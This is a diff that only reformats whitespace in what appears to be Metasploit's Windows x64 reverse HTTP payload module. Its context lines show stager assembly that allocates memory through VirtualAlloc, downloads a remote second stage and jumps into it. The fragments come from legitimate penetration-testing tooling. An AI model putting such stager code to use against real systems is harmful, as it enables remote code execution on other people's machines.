@@ -464,7 +464,6 @@ module Payload::Windows::ReverseHttp_x64
         test eax, eax                 ; did the download fail?
         jz failure
         add rsp, 40                   ; remove 32 bytes of home space and 8 bytes of bytesRead
-
         ; allocate memory for stage
         push rbx
         pop rcx                       ; lpAddress (NULL)
@@ -475,7 +474,6 @@ module Payload::Windows::ReverseHttp_x64
         mov r8, 0x1000                ; flAllocationType (0x1000=MEM_COMMIT)
         mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call rbp
-
         ;download stage
       download_prep:
         xchg rax, rbx                 ; store the allocated base in rbx
@@ -494,8 +492,8 @@ module Payload::Windows::ReverseHttp_x64
         pop rax                       ; clear up reserved space
     ^
 
-      else
-        asm << %Q^
+    else
+    asm << %Q^
       allocate_memory:
         push rbx
         pop rcx                       ; lpAddress (NULL)
@@ -531,12 +529,13 @@ module Payload::Windows::ReverseHttp_x64
         test eax, eax                 ; are we done?
         jnz download_more             ; keep going
         pop rax                       ; clear up reserved space
-    ^
 
+    ^
     end
-      asm << %Q^
-    execute_stage:
-      ret                           ; return to the stored stage address
+
+    asm << %Q^
+      execute_stage:
+        ret                           ; return to the stored stage address
     ^
 
     if opts[:exitfunk]
